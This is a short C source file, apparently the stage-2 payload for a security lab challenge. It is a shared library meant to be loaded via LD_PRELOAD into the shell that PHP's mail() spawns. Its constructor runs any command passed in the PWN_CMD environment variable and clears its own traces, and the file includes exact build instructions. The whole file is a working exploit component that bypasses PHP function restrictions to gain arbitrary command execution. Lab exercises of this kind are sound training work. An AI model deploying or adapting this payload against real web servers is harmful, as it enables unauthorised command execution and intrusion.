/*
 * Stage-2 payload for lab 18.
 *
 * Loaded through LD_PRELOAD into the /bin/sh that PHP's mail() spawns via
 * popen(sendmail_path).  The constructor runs during dynamic linking, long
 * before sh tries (and fails) to exec /usr/sbin/sendmail, so the missing
 * sendmail binary is irrelevant.
 *
 * Build (matches the challenge image, Debian 13 / glibc 2.41, x86_64):
 *   docker run --rm -v "$PWD:/w" -w /w debian:trixie-slim sh -c \
 *     'apt-get update -qq && apt-get install -y -qq gcc libc6-dev && \
 *      gcc -shared -fPIC -o hook.so hook.c'
 */
#define _GNU_SOURCE
#include <stdlib.h>

__attribute__((constructor)) static void kick(void)
{
    const char *cmd = getenv("PWN_CMD");
    if (!cmd)
        return;
    /* Drop the hook so the shell we are about to spawn does not reload us. */
    unsetenv("LD_PRELOAD");
    unsetenv("PWN_CMD");
    system(cmd);
}
